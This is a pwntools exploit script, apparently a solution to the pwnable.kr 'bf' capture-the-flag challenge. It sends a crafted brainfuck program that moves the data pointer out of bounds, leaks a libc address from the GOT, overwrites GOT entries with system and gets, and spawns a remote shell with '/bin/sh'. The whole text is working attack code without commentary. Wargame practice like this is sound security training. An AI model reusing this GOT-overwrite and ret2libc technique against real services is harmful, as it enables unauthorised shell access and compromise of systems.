from pwn import *
#ihciah@gmail.com
context.log_level = 'debug'
libc = ELF('./bin/bf_libc.so')
bf = remote('pwnable.kr', 9001)
bf.recvline_startswith('type')
bf.sendline('<'*112+'.'+'.>'*4+'<'*4+',>'*4+'<'*(4+32)+',>'*4+'<'*4+'>'*28+',>'*4+'.')
bf.recv(4)
x=bf.recv(4)[::-1]
jump=0x080484E0
bf.send(p32(jump))
system=int(x.encode('hex'),16)-libc.symbols['putchar']+libc.symbols['system']
gets=int(x.encode('hex'),16)-libc.symbols['putchar']+libc.symbols['gets']
bf.send(p32(system))
bf.send(p32(gets))
bf.sendline('/bin/sh\x00')
bf.interactive()
